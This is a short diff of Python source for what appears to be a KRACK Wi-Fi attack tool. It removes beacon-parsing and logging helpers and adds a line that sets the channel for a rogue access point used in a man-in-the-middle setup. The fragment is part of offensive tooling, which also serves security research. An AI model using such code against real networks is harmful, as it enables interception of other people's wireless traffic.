@@ -14,22 +14,6 @@ import sys, os, socket, struct, time, argparse, heapq, subprocess, atexit, selec
 from datetime import datetime
 from wpaspy import Ctrl
 
-# 取得 beacon frame 的 ssid func.
-def get_tlv_value(p, typee):
-	if not p.haslayer(Dot11Elt): return None
-	el = p[Dot11Elt]
-	while isinstance(el, Dot11Elt):
-		if el.ID == typee:
-			return el.info.decode()
-		el = el.payload
-	return None
-
-# 印出 func.
-def print_rx(level, name, p, color=None, suffix=None):
-	if p[Dot11].type == 1: return
-	if color is None and (p.haslayer(Dot11Deauth) or p.haslayer(Dot11Disas)): color="orange"
-	log(level, "%s: %s -> %s: %s%s" % (name, p.addr2, p.addr1, dot11_to_str(p), suffix if suffix else ""), color=color)
-
 # 紀錄網路的 config
 class NetworkConfig():
 	def __init__(self):
@@ -594,6 +578,7 @@ class KRAckAttack():
 		elif self.netconfig.real_channel > 13:
 			log(WARNING, "Attack not yet tested against 5 GHz networks.")
 		self.netconfig.find_rogue_channel()
+		self.sock_rogue.set_channel(self.netconfig.rogue_channel)
 
 		log(STATUS, "Target network %s detected on channel %d" % (self.apmac, self.netconfig.real_channel), color="green")
 		log(STATUS, "Will create rogue AP on channel %d" % self.netconfig.rogue_channel, color="green")
